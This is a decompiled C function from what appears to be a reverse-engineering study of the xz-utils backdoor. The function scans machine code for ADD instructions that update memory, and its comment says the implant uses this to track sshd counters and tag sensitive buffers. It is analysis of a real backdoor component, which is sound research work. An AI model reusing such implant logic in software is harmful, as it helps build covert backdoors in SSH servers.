// /home/kali/xzre-ghidra/xzregh/101170_find_add_instruction_with_mem_operand.c
// Function: find_add_instruction_with_mem_operand @ 0x101170
// Calling convention: unknown
// Prototype: undefined find_add_instruction_with_mem_operand(void)


/*
 * AutoDoc: Locates ADD instructions that update memory at a given address, capturing the scale of the increment. The scoring logic uses it to observe how sshd mutates counters so the implant can tag sensitive buffers.
 */
#include "xzre_types.h"


undefined8
find_add_instruction_with_mem_operand(ulong param_1,ulong param_2,long *param_3,long param_4)

{
  int iVar1;
  long lVar2;
  long *plVar3;
  long local_80 [12];
  
  plVar3 = local_80;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)plVar3 = 0;
    plVar3 = (long *)((long)plVar3 + 4);
  }
  if (param_3 == (long *)0x0) {
    param_3 = local_80;
  }
  while( TRUE ) {
    if (param_2 <= param_1) {
      return 0;
    }
    iVar1 = x86_dasm(param_3,param_1,param_2);
    if ((((iVar1 != 0) && ((int)param_3[5] == 0x103)) &&
        ((*(uint *)((long)param_3 + 0x1c) & 0xff00ff00) == 0x5000000)) &&
       ((param_4 == 0 ||
        (((*(byte *)((long)param_3 + 0x11) & 1) != 0 &&
         (param_4 == param_3[6] + *param_3 + param_3[1])))))) break;
    param_1 = param_1 + 1;
  }
  return 1;
}

